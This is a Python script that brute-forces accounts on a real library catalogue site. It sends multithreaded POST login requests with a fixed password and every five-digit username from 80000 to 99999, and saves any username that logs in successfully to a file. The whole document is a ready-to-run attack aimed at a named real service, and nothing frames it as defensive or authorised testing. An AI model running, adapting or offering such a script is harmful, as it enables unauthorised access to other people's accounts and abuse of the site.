import threading
import requests

data = {"username":"", "password":"040226","wd":"", "_csrf":"393b1f80-d7a2-4861-a1c8-79ba721d7e30"}
url = "https://tritius.knihovnatrinec.cz/process-login"

thread_num = 13
start = 80000
threads = []



def thread_function(start, end, hop):
    
    for i in range(start,end,hop):
        data["username"] = str(i).zfill(5)
        try:
            response = requests.post(url, data=data)
        except:
            pass


        if response.url == "https://tritius.knihovnatrinec.cz/":
            file = open(str(i) + ".txt","w")
            file.write(data["username"] + " " + data["password"] + "\n")
            file.close()
            print(data["username"], "valid")
        else:
            print(data["username"], "invalid")


    

for i in range(thread_num):
    threads.append(threading.Thread(target=thread_function, args=(start + i,100000,thread_num)))
    threads[i].start()
